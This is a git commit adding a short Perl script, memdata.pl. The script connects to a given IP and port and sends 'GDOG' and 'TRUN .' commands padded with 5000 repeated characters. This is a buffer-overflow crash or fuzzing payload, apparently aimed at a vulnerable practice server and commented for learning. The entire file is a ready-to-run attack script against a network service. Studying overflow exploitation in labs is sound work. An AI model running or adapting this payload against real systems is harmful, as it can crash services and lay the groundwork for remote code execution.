6cd0dd267232d8eeffe4357026c13058f43c4139
Yorick de Wid <yorickdewid@users.noreply.github.com>
2014-10-20 20:04:20 +0200

    Create memdata.pl

---
+++ memdata.pl
@@ -0,0 +1,24 @@
+#!/usr/bin/perl
+use IO::Socket;
+if ($ARGV[1] eq '') {
+die("Usage: $0 IP_ADDRESS PORT\n\n");
+}
+$memdata = "GDOG "; #sets variable $memdata to "GDOG "
+$memdata .= "B" x 5000; # appends (.=) 5000 "B" characters to $memdata
+
+$baddata = "TRUN ."; # sets variable $baddata to "TRUN ."
+$baddata .= "A" x 5000; # appends (.=) 5000 "A" characters to $baddata
+
+$socket = IO::Socket::INET->new( # setup TCP socket – $socket
+Proto => "tcp",
+PeerAddr => "$ARGV[0]", # command line variable 1 – IP Address
+PeerPort => "$ARGV[1]" # command line variable 2 – TCP port
+) or die "Cannot connect to $ARGV[0]:$ARGV[1]";
+
+$socket->recv($sd, 1024); # Receive 1024 bytes data from $socket, store in $sd
+
+print "$sd"; # print $sd variable
+$socket->send($memdata); # send $memdata variable via $socket
+$socket->recv($sd, 1024); # Receive 1024 bytes data from $socket, store in $sd
+print "$sd"; # print $sd variable
+$socket->send($baddata); # send $baddata variable via $socket
